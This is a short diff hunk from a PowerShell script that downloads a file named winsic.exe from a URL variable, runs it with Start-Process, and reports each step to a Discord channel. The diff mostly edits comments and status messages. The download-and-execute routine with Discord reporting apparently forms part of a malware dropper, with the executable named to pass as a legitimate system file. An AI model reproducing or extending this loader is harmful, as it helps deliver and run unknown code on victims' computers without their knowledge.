@@ -258,14 +258,14 @@ try {
     exit 1
 }
 
-# Download and execute Ghost_configured.py
-Send-DiscordMessage -message "winsic.exe..."
+# Download and execute winsic.exe
+Send-DiscordMessage -message "Downloading winsic.exe..."
 Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
 
-Send-DiscordMessage -message "winsic.exe..."
+Send-DiscordMessage -message "Executing winsic.exe..."
 try {
-    Start-Process -FilePath $ghostConfigPyPath -NoNewWindow -PassThru -Wait
-    Send-DiscordMessage -message "winsic.exe successfully."
+    Start-Process -FilePath $ghostConfigPyPath -NoNewWindow -Wait
+    Send-DiscordMessage -message "Executed winsic.exe successfully."
 } catch {
     $message = "Error executing winsic.exe: $(${_})"
     Send-DiscordMessage -message $message
